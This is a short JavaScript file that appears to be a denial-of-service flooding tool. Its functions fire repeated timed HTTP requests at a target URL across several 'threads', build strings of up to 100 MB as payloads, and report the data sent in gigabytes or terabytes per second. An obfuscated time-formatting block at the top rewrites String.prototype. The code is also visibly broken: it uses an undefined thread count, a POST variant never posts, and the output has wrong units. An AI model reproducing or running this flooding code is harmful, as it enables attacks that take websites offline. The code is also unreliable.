const ax = require('axios')
const cluster = require("cluster");
const _0x248a5a=_0x205a;function _0x205a(e,t){const n=_0x32b6();return(_0x205a=function(e,t){return n[e-=299]})(e,t)}function picoPerMillisecond(){return 1e9}function nanoPerMillisecond(){return 1e6}function _0x32b6(){const e=["join","5370DHXJik","getSeconds","repAll","5302uuZiKI","1472oHUdKx","getMinutes","getMonth","split","28xaPKPM","224xPPTKg","10716TJPywO","getFullYear","4525790eCjYJo","9wmQrzm","30232PQBuEw","12aIJQgJ","floor","getMilliseconds","185715Vpqhis","12787268CxWWwW","11690xYHvuS","getHours","prototype","getDate","length","2128PBgmZl"];return(_0x32b6=function(){return e})()}function microPerMillisecond(){return.001/1e-6}function time(e){const t=_0x248a5a;let n=e;return n=n[t(309)]("y",(new Date)[t(318)]()),n=n[t(309)]("M",(new Date)[t(313)]()+1),n=n[t(309)]("d",(new Date)[t(303)]()),(new Date)[t(301)]()>12?n=n[t(309)]("h",(new Date).getHours()-12):(new Date)[t(301)]()<12&&0!==(new Date).getHours()?n=n[t(309)]("h",(new Date)[t(301)]()):(0===(new Date)[t(301)]()||12===(new Date).getHours())&&(n=n.repAll("h","12")),n=1===String((new Date)[t(312)]())[t(304)]?n[t(309)]("m","0"+(new Date).getMinutes()):n[t(309)]("m",(new Date)[t(312)]()),n=1===String((new Date)[t(308)]())[t(304)]?n[t(309)]("s","0"+(new Date)[t(308)]()):n.repAll("s",(new Date)[t(308)]()),n=n[t(309)]("S",(new Date)[t(324)]()),n=n[t(309)]("p",Math[t(323)]((new Date).getMilliseconds()*ppm())),n=n.repAll("n",Math[t(323)]((new Date)[t(324)]()*npm())),n=n.repAll("u",Math[t(323)]((new Date)[t(324)]()*mpm())),n=(new Date)[t(301)]()<12?n[t(309)]("b","AM"):n[t(309)]("b","PM"),n}function timeHalf(){return t("b")}(function(e,t){const n=_0x205a,a=_0x32b6();for(;;)try{if(660297===-parseInt(n(300))/1*(-parseInt(n(316))/2)+-parseInt(n(307))/3*(parseInt(n(311))/4)+parseInt(n(325))/5*(parseInt(n(322))/6)+parseInt(n(305))/7*(-parseInt(n(321))/8)+parseInt(n(320))/9*(-parseInt(n(319))/10)+parseInt(n(310))/11*(-parseInt(n(317))/12)+parseInt(n(299))/13*(parseInt(n(315))/14))break;a.push(a.shift())}catch(e){a.push(a.shift())}})(),String[_0x248a5a(302)][_0x248a5a(309)]=function(e,t){const n=_0x248a5a;return this[n(314)](e)[n(306)](t)},ppm=picoPerMillisecond,npm=nanoPerMillisecond,mpm=microPerMillisecond,amPm=timeHalf;let t=time;

function mk(url) {
  ax.get(url)
}

function mkPost(url, data) {
  ax.post(url, data)
}

function NDistDos(url, interval) {
  Array(threads).fill(1).forEach(thread => {
    ult(url, interval)
  })
}

function NDistDosPost(url, interval) {
  Array(threads).fill(1).forEach(thread => {
    ult(url, interval)
  })
}
function ult(url_, interval_) {
  setInterval(()=>{
    mk(url_)
  }, interval_)
} 

function longString(msg, mb=10) {
  if (mb > 100) {
    throw new Error("Cap for string size is 100MB")
    return 
  }
  return msg.repeat((mb*1000000)/msg.length)
}

let sentMB = 0;
let mbps = 0;
function doTest(string, threads=1, computers=1, interval, time) {
  let st = new Date().getTime()/1000
  let iint = setInterval(()=>{
    sentMB += ((string.length/1000000)*threads)*computers
  }, interval)
  setTimeout(()=>{
    let et = new Date().getTime()/1000
    clearInterval(iint)
    console.log(`Test done. Time elapsed: ${et-st}`)
    if (sentMB < 1000) {
      console.log(`Total data: ${sentMB/1000}GB  with a rate of ${(sentMB/1000)/time} gBps`)
      console.log("gBps = Gigabytes per second")
    } else if (sentMB >= 1000) {
      console.log(`Total data: ${(sentMB/1000)/1000}TB with a rate of ${((sentMB/1000)/1000)/time} tBps`)
      console.log("tBps = Terabytes per second")
    }
  }, time*1000)
}
  

